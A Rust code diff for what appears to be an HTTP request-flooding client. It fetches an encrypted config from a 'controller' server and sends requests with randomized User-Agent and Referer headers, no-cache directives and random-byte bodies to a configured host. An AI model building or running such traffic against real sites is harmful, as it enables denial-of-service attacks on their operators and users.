@@ -1,7 +1,7 @@
 pub mod config;
 
 use config::ControllerConfig;
-use iblib::{connection::create_stream, constant::*, debug, response::Response, util::*};
+use iblib::{connection::create_stream, constant::*, debug, response::Response, ternary, util::*};
 
 pub fn fetch_controller_config() -> Result<ControllerConfig> {
   let headers = format!(
@@ -24,6 +24,11 @@ pub fn fetch_controller_config() -> Result<ControllerConfig> {
   stream.write_buf(headers.as_bytes())?;
 
   let res: Response = Response::from(stream.get_res()?);
+
+  if res.body.is_empty() {
+    return Err("Response body is empty".into());
+  }
+
   let conf = parse_config(&res.decrypted_body());
   let conf = ControllerConfig::from(conf);
 
@@ -34,9 +39,10 @@ pub fn fetch_controller_config() -> Result<ControllerConfig> {
 
 pub fn call(conf: &ControllerConfig) -> Result<Response> {
   let mut stream = create_stream(conf.ssl, &conf.host, conf.port)?;
-  let body = generate_body(conf);
+  let body = get_body(conf);
+  let headers = get_headers(conf, body.len());
 
-  stream.write_buf(conf.headers.as_bytes())?;
+  stream.write_buf(&headers)?;
   stream.write_buf(BODY_SEPARATOR.as_bytes())?;
 
   if body.len() as u32 > MAX_BUFFER_CHUNK_SIZE {
@@ -54,17 +60,37 @@ pub fn call(conf: &ControllerConfig) -> Result<Response> {
   return Ok(Response::from(stream.get_res()?));
 }
 
-pub fn generate_body(conf: &ControllerConfig) -> Vec<u8> {
-  let body: Vec<u8>;
+pub fn get_body(conf: &ControllerConfig) -> Vec<u8> {
+  ternary!(
+    conf.raw_bodies.is_empty(),
+    gen_random_bytes(conf.content_length as usize),
+    get_random_item(&conf.raw_bodies).as_bytes().to_vec()
+  )
+}
 
-  if !conf.body.is_empty() {
-    body = conf.body.as_bytes().to_vec();
+pub fn get_headers(conf: &ControllerConfig, content_length: usize) -> Vec<u8> {
+  if conf.raw_headers.is_empty() {
+    let mut headers = vec![
+      format!("{} {} HTTP/1.1", conf.method, conf.path),
+      format!("Host: {}:{}", conf.host, conf.port),
+      format!("Content-Length: {}", content_length),
+      format!("Cache-Control: no-cache"),
+      format!("Connection: keep-alive"),
+    ];
+
+    if !conf.user_agents.is_empty() {
+      headers.push(format!(
+        "User-Agent: {}",
+        get_random_item(&conf.user_agents)
+      ))
+    }
+
+    if !conf.referers.is_empty() {
+      headers.push(format!("Referer: {}", get_random_item(&conf.referers)))
+    }
+
+    headers.join(CRLF).as_bytes().to_vec()
   } else {
-    body = vec![0; conf.content_length as usize]
-      .iter()
-      .map(|_| gen_random_byte())
-      .collect();
+    get_random_item(&conf.raw_headers).as_bytes().to_vec()
   }
-
-  body
 }
